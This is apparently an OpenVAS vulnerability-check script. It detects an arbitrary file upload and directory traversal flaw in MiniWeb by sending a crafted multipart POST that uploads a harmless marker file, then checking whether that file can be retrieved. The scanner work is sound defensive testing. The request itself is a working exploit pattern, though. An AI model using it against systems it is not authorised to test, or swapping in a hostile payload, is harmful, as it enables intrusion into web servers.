###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_miniweb_file_upload_n_dir_trav_vuln.nasl 4622 2016-11-25 06:51:16Z cfi $
#
# MiniWeb Arbitrary File Upload and Directory Traversal Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_id(803477);
  script_version("$Revision: 4622 $");
  script_bugtraq_id(58946);
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2016-11-25 07:51:16 +0100 (Fri, 25 Nov 2016) $");
  script_tag(name:"creation_date", value:"2013-04-17 18:42:05 +0530 (Wed, 17 Apr 2013)");
  script_name("MiniWeb Arbitrary File Upload and Directory Traversal Vulnerabilities");

  tag_summary =
"This host is installed with MiniWeb and is prone to file upload
and directory traversal vulnerabilities.";

  tag_vuldetect =
"Send a crafted HTTP POST request and check wheather it is able to upload
arbirary file or not.";

  tag_insight =
"Flaw is due to improper sanitation of user supplied input via the 'filename'
parameter and uploading a file to a non existing directory.";

  tag_impact =
"Successful exploitation will allow remote attackers to overwrite legitimate
content and upload files to arbitrary locations outside of the web path.

Impact Level: Application";

  tag_affected =
"MiniWeb (build 300, built on Feb 28 2013)";

  tag_solution =
"No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name:"solution_type", value:"WillNotFix");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/52923");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/121168");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/52923");
  script_summary("Check if the file is uploaded in MiniWeb");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_require_ports("Services/www", 8000);
  script_dependencies("find_service.nasl", "http_version.nasl");
  exit(0);
}


include("http_func.inc");
include("misc_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
file = "";
req = "";
url = "";

## Get HTTP Port
port = get_http_port(default:8000);
if(!port){
  port = 8000;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Function to Upload the file
function upload_file(url, file)
{
  postData = string(
  '------WebKitFormBoundarybzq9yiXANBqlqUBo\r\n',
  'Content-Disposition: form-data; name="user"\r\n\r\n',
  'Username\r\n',
  '------WebKitFormBoundarybzq9yiXANBqlqUBo\r\n',
  'Content-Disposition: form-data; name="pass"\r\n\r\n',
  'Password\r\n',
  '------WebKitFormBoundarybzq9yiXANBqlqUBo\r\n',
  'Content-Disposition: form-data; name="file"; filename="' + file + '"\r\n',
  'Content-Type: text/plain\r\n\r\n',
  'File-Upload-Vulnerability-Test\r\n\r\n',
  '------WebKitFormBoundarybzq9yiXANBqlqUBo\r\n',
  'Content-Disposition: form-data; name="button"\r\n\r\n',
  'Upload\r\n',
  '------WebKitFormBoundarybzq9yiXANBqlqUBo--\r\n');

  return string(
  "POST ", url, " HTTP/1.1\r\n",
  "Host: ", get_host_name(), "\r\n",
  "Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybzq9yiXANBqlqUBo\r\n",
  "Content-Length: ", strlen(postData),
  "\r\n\r\n", postData
  );
}

url = "/AAAAAAAAAAAAAAAAAAAAA";
file = string("ov-upload-test-", rand_str(length:5), ".txt");
req = upload_file(url:url, file:file);

## Upload the file
http_keepalive_send_recv(port:port, data: req);

## Check wheather the file is uploaded
if(http_vuln_check(port:port, url:string("/", file), check_header:TRUE,
          pattern:"File-Upload-Vulnerability-Test"))
{
  msg = 'Scanner has created a file ' + file + ' to check the vulnerability.'+
                                          ' Please remove this file as soon as possible.';
  security_message(port:port, data:msg);
  exit(0);
}
